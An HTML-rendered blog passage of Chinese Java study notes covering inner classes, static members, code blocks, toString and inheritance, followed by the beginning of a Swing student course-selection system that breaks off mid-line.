class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>局部内部类只能在所定义得方法体内部使用</li><li>不能被public，static等修饰</li><li>几乎不会被使用</li></ul><h2 id="匿名内部类-学完接口回来"><a href="#匿名内部类-学完接口回来" class="headerlink" title="匿名内部类(学完接口回来)"></a>匿名内部类(学完接口回来)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="static"><a href="#static" class="headerlink" title="static"></a>static</h1><ul><li>static 修饰的成员变量称为静态成员变量，最大特性是：不属于某个具体的对象，是所有对象所共享的。<br><em>静态成员变量特征</em></li><li>不属于某个具体的对象，是类的属性，是所有对象所共享的。不存在某个对象的空间中。</li><li>既可以通过对象访问，也可以通过类名访问，但一般推荐类名访问</li><li>类变量储存在方法区中</li><li>生命周期伴随类的一生，随类的加载而创建，随类的卸载而销毁</li><li>静态的方法内也不能访问非静态的成员或方法但非静态的可以</li><li>静态方法无法重写，不能用来实现多态</li><li>初始化要么在类内，要么在类外</li></ul><h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;yxz&quot;</span>;<span class="comment">//就地初始化，但只适合默认的一些量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;不带参数的构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;实例代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();<span class="comment">//静态的执行的更快</span></span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();<span class="comment">//static只会执行1次，赋值时如果都是static就看顺序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="对象的打印"><a href="#对象的打印" class="headerlink" title="对象的打印"></a>对象的打印</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;a=&quot;</span> + a +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">OuterClass2</span>());<span class="comment">//匿名对象 ,只能使用一次</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>右键-&gt;生成-&gt;toString()</p><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在吃饭！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">barks</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;汪汪叫！&quot;</span> + <span class="string">&quot;年龄&quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchMouse</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;正在抓老鼠&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.name = <span class="string">&quot;ctl&quot;</span>;</span><br><span class="line">        dog.age = <span class="number">12</span>;</span><br><span class="line">        dog.barks();</span><br><span class="line">        dog.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>子类会将父类的成员变量和方法继承到子类中</li><li>子类继承父类之后，必须要添加自己特有的成员，体现出与基类的不同，否则就没必要继承了。</li><li>私有的成员可以被继承但不能访问，所以会报错</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodA</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Base中的methodA()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jc2</span> <span class="keyword">extends</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">methodB</span><span class="params">()</span> &#123;</span><br><span class="line">        a = <span class="number">10</span>;<span class="comment">//当父类和字类拥有同名变量时，优先访问类自己的</span></span><br><span class="line">        <span class="built_in">super</span>.b = <span class="number">20</span>;</span><br><span class="line">        c = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.out.println(<span class="built_in">super</span>.b);</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Jc2</span> <span class="variable">jc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jc2</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Base</span> <span class="variable">base</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Base</span>();</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodA</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Base中的methodA()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jc2</span> <span class="keyword">extends</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="comment">/*    public void methodA() &#123;</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;Jc2中的methodA（）&quot;);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodB</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Jc2中的methodB（）&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodC</span><span class="params">()</span> &#123;</span><br><span class="line">        methodB();<span class="comment">// 访问子类自己的methodB（）</span></span><br><span class="line">        methodA();<span class="comment">// 访问子类继承的methodA（）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Jc2</span> <span class="variable">jc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jc2</span>();</span><br><span class="line">        jc2.methodC();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="学生选课系统"><a href="#学生选课系统" class="headerlink" title="学生选课系统"></a>学生选课系统</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.BorderLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.CardLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.Component;</span><br><span class="line"><span class="keyword">import</span> java.awt.FlowLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.GridLayout; </span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"><span class="keyword">import</span> java.util.Map.Entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.MenuEvent;</span><br><span class="line"><span class="keyword">import</span> javax.swing.event.MenuListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CourseSelectionSystem</span>&#123;</span><br><span class="line">    Database db;</span><br><span class="line">    LoginFrame login_frame;</span><br><span class="line">    MainFrame manager_frame;</span><br><span class="line">    Teach teach;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CourseSelectionSystem</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        db = <span class="keyword">new</span> <span class="title class_">Database</span>(<span class="string">&quot;course.txt&quot;</span>,<span class="string">&quot;score.txt&quot;</span>,<span class="string">&quot;account.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        db.addAccount(<span class="string">&quot;teach&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">0</span>, <span class="string">&quot;教务员  &quot;</span>);  <span class="comment">//增加新账号</span></span><br><span class="line">        db.addAccount(<span class="string">&quot;lil&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">1</span>, <span class="string">&quot;李立  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;yangf&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">1</span>, <span class="string">&quot;杨帆  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;zhangdw&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">1</span>, <span class="string">&quot;张大伟  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;wangqs&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;王青松  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;chenl&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;陈丽  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;wus&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;吴松  &quot;</span>);</span><br><span class="line">        db.addAccount(<span class="string">&quot;liuq&quot;</span>, <span class="string">&quot;666666&quot;</span>, <span class="number">2</span>, <span class="string">&quot;刘强  &quot;</span>);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        teach = <span class="keyword">new</span> <span class="title class_">Teach</span>(db);</span><br><span class="line">        login_frame = <span class="keyword">new</span> <span class="title class_">LoginFrame</span>(db, teach);</span><br><span class="line">        manager_frame = <span class="keyword">new</span> <span class="title class_">MainFrame</span>(db);</span><br><span class="line">        login_frame.initFrame(manager_frame);</span><br><span class="line">        manager_frame.initFrame(login_frame);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> LoginFrame <span class="title function_">getLogin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> login_frame;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">CourseSelectionSystem</span> <span class="variable">css</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">CourseSelectionSystem</span>();</span><br><span class="line">        css.getLogin().setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span>&#123;</span><br><span class="line">    Database db;</span><br><span class="line">    LoginFrame login_frame;</span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">manager_new_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;添加课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">student_select_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;选择课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">student_delect_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;删除课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">teacher_view_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;查看选课情况&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">teacher_info_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;查看课程信息&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JButton</span> <span class="variable">teacher_score</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;打分&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">teacher_jl_0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">teacher_jl_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;选择课程:&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_0_0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_0_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_0_2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">manager_jt_course_name</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">manager_jt_course_info</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JTextField</span> <span class="variable">teacher_jt_score</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">JTextField</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_init</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">teacher_jl_init</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">student_jl_init</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;课程名字\n&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;课程教师\n&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JLabel</span> <span class="variable">manager_jl_3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;课程信息\n&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JComboBox</span> <span class="variable">manager_jc_teacher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JComboBox</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JComboBox</span> <span class="variable">teacher_jc_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JComboBox</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="type">DefaultListModel</span> <span class="variable">student_select_course_dlm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultListModel</span>();</span><br><span class="line">    <span class="type">JList</span> <span class="variable">student_select_course_jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JList</span>(student_select_course_dlm);</span><br><span class="line">    <span class="type">JScrollPane</span> <span class="variable">student_select_course_jsp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(student_select_course_jl);</span><br><span class="line"></span><br><span class="line">    <span class="type">DefaultListModel</span> <span class="variable">student_delect_course_dlm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultListModel</span>();</span><br><span class="line">    <span class="type">JList</span> <span class="variable">student_delect_course_jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JList</span>(student_delect_course_dlm);</span><br><span class="line">    <span class="type">JScrollPane</span> <span class="variable">student_delect_course_jsp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(student_delect_course_jl);</span><br><span class="line">    </span><br><span class="line">    <span class="type">DefaultListModel</span> <span class="variable">teacher_score_dlm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultListModel</span>();</span><br><span class="line">    <span class="type">JList</span> <span class="variable">teacher_score_jl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JList</span>(teacher_score_dlm);</span><br><span class="line">    <span class="type">JScrollPane</span> <span class="variable">teacher_score_jsp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JScrollPane</span>(teacher_score_jl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">menu_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">menu_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">content_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">content_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">manager_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">manager_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenuBar</span> <span class="variable">manager_menuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">manager_menu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;添加课程&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">manager_init_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">manager_new_course_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">teacher_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenuBar</span> <span class="variable">teacher_menuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">teacher_menu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;教学任务管理&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_init_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_north</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_north_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">teacher_score_south</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_cards</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">CardLayout</span> <span class="variable">student_c_layout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CardLayout</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenuBar</span> <span class="variable">student_menuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">student_menu_select_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;选课&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">student_menu_delect_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;退选&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JMenu</span> <span class="variable">student_menu_view_course</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;View Course&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_init_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_select_course_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_delect_course_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">JPanel</span> <span class="variable">student_view_score_page</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainFrame</span><span class="params">(Database db)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="string">&quot;选课系统&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.addWindowListener(<span class="keyword">new</span> <span class="title class_">WindowAdapter</span>() &#123;</span><br><span class="line">              <span class="meta">@Override</span></span><br><span class="line">              <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">windowClosing</span><span class="params">(WindowEvent e)</span></span><br><span class="line">              &#123;</span><br><span class="line">                 <span class="keyword">try</span> &#123;</span><br><span class="line">                    db.updataAll();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line"></span><br><span class="line">                    e1.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                setVisible(<span class="literal">false</span>);</span><br><span class="line">                login_frame.setVisible(<span class="literal">true</span>);</span><br><span class="line">                clear();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        <span class="built_in">this</span>.db = db;</span><br><span class="line">        </span><br><span class="line">        setLocation(<span class="number">800</span>,<span class="number">400</span>);   </span><br><span class="line"></span><br><span class="line">        setLayout(<span class="keyword">new</span> <span class="title class_">BorderLayout</span>());</span><br><span class="line">        menu_cards.setLayout(menu_c_layout);</span><br><span class="line">        content_cards.setLayout(content_c_layout);</span><br><span class="line">        add(<span class="string">&quot;North&quot;</span>,menu_cards);</span><br><span class="line">        add(<span class="string">&quot;Center&quot;</span>,content_cards);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        initManagerPage();</span><br><span class="line">        initTeacherPage();</span><br><span class="line">        initStudentPage();</span><br><span class="line">        </span><br><span class="line">        pack();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initTeacherPage</span><span class="params">()</span> &#123;</span><br><span class="line">        teacher_score_jl.setCellRenderer(<span class="keyword">new</span> <span class="title class_">ScoreCellRenderer</span>());</span><br><span class="line">        teacher_jc_course.setRenderer(<span class="keyword">new</span> <span class="title class_">CourseTeaCellRenderer</span>());</span><br><span class="line">        </span><br><span class="line">        teacher_menuBar.add(teacher_menu);</span><br><span class="line">        teacher_menu.addMenuListener(<span class="keyword">new</span> <span class="title class_">MenuListener</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">menuSelected</span><span class="params">(MenuEvent e)</span> &#123;</span><br><span class="line">                teacher_c_layout.show(teacher_cards, <span 